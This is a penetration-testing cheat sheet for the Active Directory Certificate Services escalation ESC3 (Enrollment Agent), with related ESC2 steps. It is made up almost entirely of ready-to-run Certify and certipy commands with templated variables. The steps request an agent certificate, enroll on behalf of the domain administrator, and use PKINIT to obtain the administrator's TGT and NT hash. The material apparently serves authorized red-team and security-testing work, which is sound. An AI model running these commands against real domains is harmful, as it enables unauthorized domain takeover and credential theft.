---
technique: ESC3 - Enrollment Agent
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc3 certificate-services pkinit
---

# ESC3 - Enrollment Agent

ESC3 abuses Enrollment Agent certificates to request certificates on behalf of another principal.

## Windows

### ESC2: Certify (request)

#powershell #certify #any-purpose

Request a cert from an Any Purpose EKU template; if SAN is not enrollee-supplied, pivot to ESC3 flow using the issued cert as an enrollment agent.

```powershell title:"ESC2: request from any-purpose template with Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC3: Step 2: enroll on behalf of admin (Certify)

#powershell #certify #enrollment-agent

Use the enrollment agent cert to enroll on behalf of a privileged user.

```powershell title:"ESC3: enroll on behalf of admin using agent cert"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User" /onbehalfon:"$domain\$target_user" /enrollcert:"$agent_pfx" /enrollcertpw:"$pfx_pass"
```
<!-- cheat
import domain_ip
import users
var ca_name
var target_user
var agent_pfx
var pfx_pass
-->

## Linux

### ESC2: Step 2: request from any-purpose template (certipy)

#certipy #any-purpose

Request a cert from the any-purpose or no-EKU template; if SAN is not available, continue to ESC3 flow.

```sh title:"ESC2: request from any-purpose template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC3: Step 2: enroll on behalf of administrator (certipy)

#certipy #enrollment-agent

Use the enrollment agent cert to enroll on behalf of administrator.

```sh title:"ESC3: enroll on-behalf-of administrator using agent cert"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -on-behalf-of "$domain\\administrator" -pfx $agent_pfx
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var agent_pfx
-->

### ESC3: Step 3: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the administrator TGT and NT hash.

```sh title:"ESC3: PKINIT with administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->
